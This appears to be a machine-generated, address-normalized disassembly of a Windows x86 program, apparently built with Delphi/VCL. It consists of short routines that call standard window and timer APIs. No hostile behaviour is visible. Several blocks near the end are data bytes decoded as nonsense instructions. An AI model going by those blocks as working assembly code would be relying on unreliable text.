cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_45b62b
jmp sub_4039e4
sub_45b632
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b638
push ebx
mov ebx eax
mov eax ebx
call sub_443280
mov eax ebx
call sub_443404
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45ac38
sub_45b8ae
jmp sub_4039e4
sub_45b8b5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b8bc
push ebx
mov ebx edx
mov edx ebx
call sub_4436e8
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_43d660
pop ebx
retn
sub_45b910
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45b978
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45b928
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45b978
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45b944
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45b978
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45b95c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45b978
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45bbf8
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45bc04
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45bc10
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45bc1c
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45bc28
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45bc34
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45bc40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_413a74
pop esi
pop ebx
retn
sub_45bc54
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45bc70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413a74
pop esi
pop ebx
retn
sub_45bc84
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_45bc8c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413a74
pop esi
pop ebx
retn
sub_45bca0
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_45bd7c
mov eax [ eax + 0x54 ]
call sub_413918
retn
sub_45bd88
mov eax [ eax + 0x54 ]
call sub_413bb8
retn
sub_45bfdb
jmp sub_4039e4
sub_45c01f
jmp sub_4039e4
sub_45c026
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45c074
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45be74
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_404034
pop esi
pop ebx
retn
sub_45c0e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_413a74
pop esi
pop ebx
retn
sub_45c0f4
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_45c2f9
jmp sub_4039e4
sub_45c300
pop ebx
mov esp ebp
pop ebp
retn
sub_45c308
inc [ eax + 0x8c ]
retn
sub_45c310
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_45c330
sub_45c330
xor edx edx
call sub_45c774
retn
sub_45c766
jmp sub_4039e4
sub_45c7ed
jmp sub_4039e4
sub_45c7fc
add eax 0x30
call sub_40cdfc
retn
sub_45c840
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_45c891
jmp sub_403730
sub_45c896
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_45e194
call sub_403a98
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_45cf65
jmp sub_4039e4
sub_45cf6c
pop ebx
mov esp ebp
pop ebp
retn
sub_45d0f4
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45d120
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_45d14c
xor edx edx
call sub_45d044
retn
sub_45d154
mov dl 0x1
call sub_45d044
retn
sub_45d1c8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45d1e0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_45d2ad
jmp sub_4039e4
sub_45d2b4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d9fe
jmp sub_403730
sub_45dffc
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_403730#4
jmp sub_403730
j_sub_403730#3
jmp sub_403730
sub_45e172
jmp sub_4039e4
sub_45e179
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e180
call sub_40c94c
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_45e379
jmp sub_4039e4
sub_45e380
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45e447
jmp sub_4039e4
sub_45e44e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e624
jmp sub_4039e4
sub_45e62b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e68c
jmp sub_4039e4
sub_45e693
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e69c
call sub_45e464
retn
sub_45e887
jmp sub_403730
sub_45e8e0
jmp sub_4039e4
sub_45e8e7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ea15
jmp sub_4039e4
sub_45eb74
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_45ee73
jmp sub_4039e4
sub_45eea2
jmp sub_4039e4
sub_45efae
jmp sub_4039e4
sub_45efb5
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45f346
jmp sub_4039e4
sub_45f34d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f470
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_45f4bb
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_45f4cc
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_45f4dc
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_45f54f
jmp sub_4039e4
sub_45f556
pop ebp
retn
sub_45f558
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45f4ec
call sub_403db4
call sub_45f470
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_455224
call sub_413568
sub_45f9a6
jmp sub_4039e4
sub_45f9ad
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45fb25
jmp sub_4039e4
sub_45fb2c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45fb79
jmp sub_4039e4
sub_45fb80
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45fd91
jmp sub_4039e4
sub_45fd98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_45ff6a
jmp sub_4039e4
sub_45ff71
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45ffa1
jmp sub_4039e4
sub_45ffa8
pop ebp
retn
sub_45ffac
sub [ rw-data ] 0x1
retn
sub_4603b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f804
movsx eax [ esi + 0x8 ]
mov [ ebx + 0x234 ] eax
pop esi
pop ebx
retn
sub_460430
push ebx
mov ebx eax
mov eax ebx
call sub_44309c
mov eax ebx
call sub_4607d0
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_460c60
sub_4604ac
jmp sub_4039e4
sub_4604b3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46050c
jmp sub_4039e4
sub_460513
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4605a0
jmp sub_4039e4
sub_4605a7
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4606a6
jmp sub_4039e4
sub_4606ad
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4607c2
jmp sub_4039e4
sub_4607c9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4607d0
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
setne al
pop ebx
retn
sub_460895
jmp sub_4039e4
sub_46089c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460970
mov eax [ eax + 0x208 ]
retn
sub_460bbe
jmp sub_4039e4
sub_460c50
jmp sub_4039e4
sub_460c57
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460ca0
xor edx edx
call sub_4605b0
retn
sub_460ca8
mov al 0x1
retn
sub_460e99
jmp sub_4039e4
sub_460ea0
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461086
jmp sub_4039e4
sub_46108d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4610cc
push ebx
mov ebx eax
mov eax edx
dec eax
mov edx eax
mov eax ebx
call sub_461110
mov edx eax
mov eax ebx
call sub_4609f0
pop ebx
retn
sub_461320
jmp sub_4039e4
sub_461327
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4613b3
jmp sub_4039e4
sub_4613ba
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461441
jmp sub_4039e4
sub_461448
pop ebx
mov esp ebp
pop ebp
retn
sub_46154e
jmp sub_4039e4
sub_461555
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4617a6
jmp sub_4039e4
sub_4617ad
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461850
mov edx [ rw-data ]
cmp [ edx + 0x4 ] 0x11
jne r-xdata
xor eax eax
retn
add al 0x5f
sub al 0x3f
jb r-xdata
mov al 0x1
retn
sub_461936
jmp sub_4039e4
sub_46193d
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_461bfa
jmp sub_4039e4
sub_461c01
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_462014
jmp sub_4039e4
sub_46201b
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4620a9
jmp sub_4039e4
sub_4620b0
pop ebp
retn
sub_4620b4
sub [ rw-data ] 0x1
retn
sub_462280
mov esp 0xbbffbaff
jmp [ esp + edi + 0x46 ]
sub_4637c0
cmp eax [ ecx ]
jl r-xdata
xor eax eax
retn
cmp eax [ ecx + 0x8 ]
jg r-xdata
cmp edx [ ecx + 0x4 ]
jl r-xdata
cmp edx [ ecx + 0xc ]
jle r-xdata
mov al 0x1
retn
sub_463b2b
jmp sub_4039e4
sub_463b32
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_463c4c
push ebx
mov ebx edx
mov edx ebx
call sub_434e24
or [ ebx + 0x4 ] 0x4
pop ebx
retn
sub_463c5c
mov [ eax + 0x240 ] edx
retn
sub_463c64
retn
sub_463cf0
push esi
mov eax [ eax + 0x240 ]
mov si 0xffe9
call sub_40348c
pop esi
retn
sub_463d38
push esi
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_40348c
pop esi
retn
sub_464210
push esi
push ecx
mov [ esp ] cl
mov cl [ esp ]
mov eax [ eax + 0x240 ]
mov si 0xffbb
call sub_40348c
pop edx
pop esi
retn
sub_4642a4
push ebx
mov ebx eax
push 0xffffffff
push 0x7fffffff
push 0xb1
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop ebx
retn
sub_4644b8
xor ecx ecx
call sub_4643b0
retn
sub_4644c0
mov cl 0x1
call sub_4643b0
retn
sub_464574
jmp sub_4039e4
sub_46457b
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_464834
jmp sub_4039e4
sub_46483b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4649e0
push ebx
mov ebx eax
mov eax ebx
call sub_4432a4
test [ ebx + 0x249 ] 0x20
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_464b0c
sub_464a20
mov al 0x1
retn
sub_464a24
mov al 0x1
retn
sub_464a28
mov al [ eax + 0x219 ]
retn
sub_464adc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_403fe0
pop ebp
retn 0x4
sub_464aec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_403fe0
pop ebp
retn 0x4
sub_464afc
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_464b04
xor eax eax
retn
sub_464b08
xor eax eax
retn
sub_464b0c
mov [ eax + 0x28d ] 0x0
call sub_4691b0
retn
sub_464b1c
mov [ eax + 0x28d ] 0x1
call sub_46928c
retn
sub_464b64
mov [ eax + 0x280 ] 0xffffffff
mov [ eax + 0x284 ] 0xffffffff
call sub_46928c
retn
sub_464e80
retn
sub_464f08
retn
sub_464f0c
mov al 0x1
retn
sub_464f10
retn
sub_464fac
xchg ecx edx
push edi
mov edi eax
mov eax edx
[ edi ]
pop edi
retn
j_sub_403730#2
jmp sub_403730
sub_4666f5
jmp sub_4039e4
sub_4666fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466719
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_466712
jmp sub_4039e4
sub_466719
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_466884
jmp sub_4039e4
sub_46688b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4668a8
mov eax [ ebp - 0x8 ]
call sub_403290
retn
sub_4668a1
jmp sub_4039e4
sub_4668a8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466b88
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_46739d
jmp sub_4039e4
sub_4673a4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_467404
push ebp
mov ebp esp
call sub_466b88
pop ebp
retn 0x4
sub_467410
push ebp
mov ebp esp
call sub_466b88
pop ebp
retn 0x4
sub_467ca6
jmp sub_4039e4
sub_467ce0
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_463bec
retn
sub_46866f
jmp sub_403730
sub_468674
cmp [ ebp - 0x11 ] 0x0
je r-xdata
call sub_403a98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_466720
sub_468ad7
jmp sub_4039e4
sub_468ade
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_468c60
mov ecx [ eax + 0x220 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x230 ]
retn
cmp edx [ eax + 0x21c ]
jl r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
sub_468c80
mov ecx [ eax + 0x250 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x234 ]
retn
cmp edx [ eax + 0x24c ]
jl r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
sub_468ca0
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
lea edx [ ebx + 0x210 ]
lea eax [ ebx + 0x228 ]
call sub_463758
pop esi
pop ebx
retn
sub_468cbc
mov ecx [ eax + 0x224 ]
test ecx ecx
jne r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
mov al 0x1
retn
sub_468cd0
push ebx
add esp 0xffffffa0
mov ebx eax
mov edx esp
mov eax ebx
call sub_465bec
mov eax [ esp + 0x10 ]
sub eax [ ebx + 0x258 ]
inc eax
add esp 0x60
pop ebx
retn
sub_468cf0
push ebx
add esp 0xffffffa0
mov ebx eax
mov edx esp
mov eax ebx
call sub_465bec
mov eax [ esp + 0x40 ]
sub eax [ ebx + 0x25c ]
inc eax
add esp 0x60
pop ebx
retn
sub_468d10
cmp dl [ eax + 0x218 ]
je r-xdata
retn
mov [ eax + 0x218 ] dl
call sub_441f08
sub_468e1e
jmp sub_4039e4
sub_468e25
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468ea4
cmp edx [ eax + 0x240 ]
je r-xdata
retn
mov [ eax + 0x240 ] edx
call sub_466b88
sub_468f40
jmp sub_4039e4
sub_468f47
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_468fd8
jmp sub_4039e4
sub_468fdf
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469010
cmp edx [ eax + 0x244 ]
je r-xdata
retn
mov [ eax + 0x244 ] edx
call sub_466b88
sub_46909c
cmp edx [ eax + 0x22c ]
je r-xdata
retn
push 0x1
mov ecx edx
mov edx [ eax + 0x228 ]
call sub_4668b0
sub_46918e
jmp sub_4039e4
sub_469195
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46919c
cmp dl [ eax + 0x254 ]
je r-xdata
retn
mov [ eax + 0x254 ] dl
call sub_441f08
sub_46920f
jmp sub_4039e4
sub_4693d2
jmp sub_4039e4
sub_4693d9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46943c
mov [ edx + 0xc ] 0x1
test [ eax + 0x249 ] 0x10
jne r-xdata
retn
test [ eax + 0x249 ] 0x8
je r-xdata
test [ eax + 0x249 ] 0x4
je r-xdata
or [ edx + 0xc ] 0x2
or [ edx + 0xc ] 0x80
sub_4694b8
push ebx
mov ebx eax
mov eax ebx
call sub_43f804
cmp [ ebx + 0x27c ] 0x0
je r-xdata
pop ebx
retn
call GetMessageTime
mov edx [ ebx + 0x27c ]
mov [ edx + 0x244 ] eax
sub_469648
movsx ecx [ edx + 0x6 ]
push ecx
push 0x1
movsx ecx [ edx + 0x4 ]
mov edx 0x1
call sub_466fb4
retn
sub_469660
movsx ecx [ edx + 0x6 ]
push ecx
push 0x1
movsx ecx [ edx + 0x4 ]
xor edx edx
call sub_466fb4
retn
sub_4696fd
jmp sub_4039e4
sub_469704
mov esp ebp
pop ebp
retn
sub_469708
push ebx
mov ebx eax
mov eax ebx
call sub_43fc28
mov eax ebx
call sub_469674
pop ebx
retn
sub_46976c
push ebx
mov ebx eax
mov eax ebx
call sub_443f80
mov eax ebx
call sub_441f08
pop ebx
retn
sub_4699e4
push ebx
mov ebx eax
mov eax ebx
call sub_467b98
mov eax ebx
call sub_46928c
pop ebx
retn
sub_4699f8
push ebx
mov ebx eax
mov ecx [ ebx + 0x21c ]
dec ecx
mov eax ebx
call sub_464dac
mov edx [ ebx + 0x21c ]
dec edx
mov eax ebx
call sub_468d24
pop ebx
retn
sub_469a1c
push ebx
mov ebx eax
mov ecx [ ebx + 0x24c ]
dec ecx
mov eax ebx
call sub_464e84
mov edx [ ebx + 0x24c ]
dec edx
mov eax ebx
call sub_4690b4
pop ebx
retn
sub_469b10
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_469b1c
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_469b28
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_469b34
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_469b40
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_469b4c
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_469b58
push ebx
mov ebx eax
mov eax ebx
call sub_443e2c
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_467b98
sub_469b74
push ebx
cmp [ eax + 0x29a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
sub_469c14
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_469d30
push ebx
mov ebx eax
mov eax ebx
call sub_464f6c
cmp [ ebx + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_469da0
mov edx [ r-xdata ]
call sub_404d9c
retn
sub_46a36c
retn
j_sub_4039e4#9
jmp sub_4039e4
sub_46a3d2
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a470
jmp sub_4039e4
sub_46a477
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4039e4#8
jmp sub_4039e4
sub_46a543
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a63b
jmp sub_4039e4
sub_46a642
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46a64c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
xor eax eax
pop ebp
retn
sub_46a6c0
push ebx
push eax
push sub_46a5d0
push eax
push sub_46a684
mov cl 0x1
mov eax edx
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
retn
sub_46a720
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
retn
sub_46a7f0
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_46a834
mov eax [ eax + 0x10 ]
call sub_46a328
retn
sub_46a86c
mov eax edx
call sub_469da0
xor eax eax
retn
sub_46a878
push ebx
mov ebx eax
mov edx sub_46a86c
mov eax [ ebx + 0x10 ]
call sub_46a364
mov eax [ ebx + 0x10 ]
call sub_46a2bc
mov eax ebx
call sub_46a7f0
pop ebx
retn
j_sub_4039e4#7
jmp sub_4039e4
j_sub_4039e4#6
jmp sub_4039e4
sub_46a9d3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4039e4#5
jmp sub_4039e4
sub_46aaad
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46aba2
jmp sub_4039e4
sub_46aba9
pop ecx
pop ebp
retn
sub_46ac83
jmp sub_4039e4
sub_46ac8a
pop ebx
pop ecx
pop ebp
retn
sub_46acf0
mov eax [ eax + 0x10 ]
call sub_46b094
retn
sub_46af24
jmp sub_4039e4
j_sub_4039e4#4
jmp sub_4039e4
sub_46af5a
pop ebx
mov esp ebp
pop ebp
retn 0x4
j_sub_4039e4#3
jmp sub_4039e4
sub_46aff7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46b000
inc [ eax + 0x2e8 ]
retn
sub_46b008
dec [ eax + 0x2e8 ]
retn
sub_46b094
push ebx
mov ebx eax
mov [ ebx + 0x2e4 ] dl
test dl dl
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x2e5 ] 0x0
je r-xdata
mov eax ebx
call sub_466b88
mov [ ebx + 0x2e5 ] 0x0
sub_46b2f5
jmp sub_4039e4
sub_46b2fc
pop ebp
retn
sub_46b300
sub [ rw-data ] 0x1
retn
sub_46cad3
adc [ ecx + 0x44818181 ] eax
clc
outsd
pop es
adc [ ecx ] edx
inc ecx
stc
sub [ ecx ] dl
adc eax edi
int3
sub_46d021
xchg esp eax
0x951e
sub_46d025
cmp dl [ ecx ]
adc [ ecx ] edx
jns r-xdata
adc ecx edi
retn 0x1119
hlt
sub_46d33e
push esp
jmp r-xdata
jmp 0xffffffff98bea460
sub_46d4d2
xchg esp eax
out 0x1e eax
xchg ebp eax
xor eax 0x79eeeeeb
lodsd [ esi ]
0xacba
sub_46e5b0
push 0xffffffe0
out dx al
out dx al
add [ ecx - 0x3065b07f ] 0xf54c9877
jpo r-xdata
0x4c9877c9 0x22f7
0x9877
sub_46e79a
pushad
retn 0xeeee
sub_46e79e
out dx al
xchg edi eax
lodsd [ esi ]
adc [ ecx ] edx
adc eax edi
jmp sub_46e770
sub_46ef16
xchg esp eax
0x951e
sub_46ef1a
adc eax 0x92eeeec2
je r-xdata
xchg esp eax
out dx al
push ds
xchg ebp eax
sbb eax 0x94eeeec2
0x951e
adc [ esp + edx * 2 - 0x3911be13 ] ebx
xchg edx eax
jmp 0xffffffffe0db0d3e
sub_46ef2e
retn
sub_46f263
retn 0xeeee
sub_4702bd
leave
xchg edx eax
0x9f941eee 0x1118
sub_4702e1
out dx al
inc ecx
clc
aaa
int3
j_sub_403730
jmp sub_403730
j_sub_4039e4#2
jmp sub_4039e4
sub_47113c
pop ebp
retn
j_sub_4039e4
jmp sub_4039e4
sub_4712f9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_471366
retn
sub_471367
jmp sub_4039e4
j_sub_471366
jmp sub_471366
sub_47136e
pop ebp
retn
sub_4714da
inc edx
add [ ebx + eax * 8 - 0x3ca3ffbe ] dh
inc edx
add [ eax ] ah
retn
